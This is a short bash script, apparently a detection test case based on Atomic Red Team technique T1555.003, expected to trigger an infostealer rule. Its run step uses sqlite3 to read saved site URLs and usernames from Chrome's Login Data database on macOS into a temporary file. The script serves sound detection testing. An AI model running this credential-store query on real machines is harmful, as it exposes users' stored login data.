#!/usr/bin/env bash
# id: A09
# attack: T1555.003
# atomic: Atomic Red Team T1555.003 #18 (Query Chrome Login Data In Place with sqlite3 - MacOS)
# expect: detected
# rule: MACOS_INFOSTEALER_BROWSER_CREDENTIALS
# type: process
# probe: immutable=1
# Chrome Login Data 를 immutable 읽기 전용으로 질의한다(원본 수정 없음). 결과(사이트와 사용자 이름)는 임시 파일에만 쓰고 화면에는 내지 않는다.
set -euo pipefail
case "${1:?run|cleanup}" in
  run)
    # 결과 파일 권한을 600 으로 만든다. ART 의 마지막 cat 출력은 버린다
    umask 077
    sqlite3 "file:$HOME/Library/Application Support/Google/Chrome/Default/Login Data?immutable=1" "SELECT origin_url, username_value FROM logins;" > "$WORK/T1555.003_chrome_logins.txt" 2>/dev/null || true
    cat "$WORK/T1555.003_chrome_logins.txt" >/dev/null 2>&1 || true
    ;;
  cleanup)
    rm -f "$WORK/T1555.003_chrome_logins.txt"
    ;;
esac
